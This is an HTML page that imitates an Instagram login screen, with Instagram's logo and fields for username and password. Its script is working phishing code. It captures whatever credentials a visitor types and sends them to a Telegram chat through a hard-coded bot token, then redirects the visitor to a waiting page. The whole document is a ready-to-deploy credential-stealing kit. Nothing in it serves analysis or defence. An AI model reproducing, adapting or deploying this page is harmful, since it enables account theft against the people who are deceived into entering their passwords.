<html>
<head>
    <title>rellDell video</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body class="bg-blue-50 flex items-center justify-center min-h-screen">
    <div class="w-full max-w-xs px-4">
        <div class="text-center mb-8">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram logo" class="mx-auto mb-4" width="50" height="50">
        </div>
        <form id="loginForm" class="bg-transparent rounded px-8 pt-6 pb-8 mb-4">
            <div class="mb-4">
                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="username" type="text" placeholder="Username, email or mobile number">
            </div>
            <div class="mb-6">
                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 mb-3 leading-tight focus:outline-none focus:shadow-outline" id="password" type="password" placeholder="Password">
            </div>
            <div class="flex items-center justify-between">
                <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline w-full" type="submit">
                    Log in
                </button>
            </div>
            <div class="text-center mt-4">
                <a class="inline-block align-baseline font-bold text-sm text-gray-700 hover:text-gray-900" href="#">
                    Forgot password?
                </a>
            </div>
        </form>
        <div class="text-center">
            <button class="bg-transparent hover:bg-blue-100 text-blue-500 font-semibold py-2 px-4 border border-blue-500 rounded w-full">
                Create new account
            </button>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const botToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM';
            const chatId = '5587800563';
            const message = `Username: ${username}\nPassword: ${password}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = 'wait.html';
                } else {
                    alert('Failed to send message to Telegram.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error sending message to Telegram.');
            });
        });
    </script>
</body>
</html>
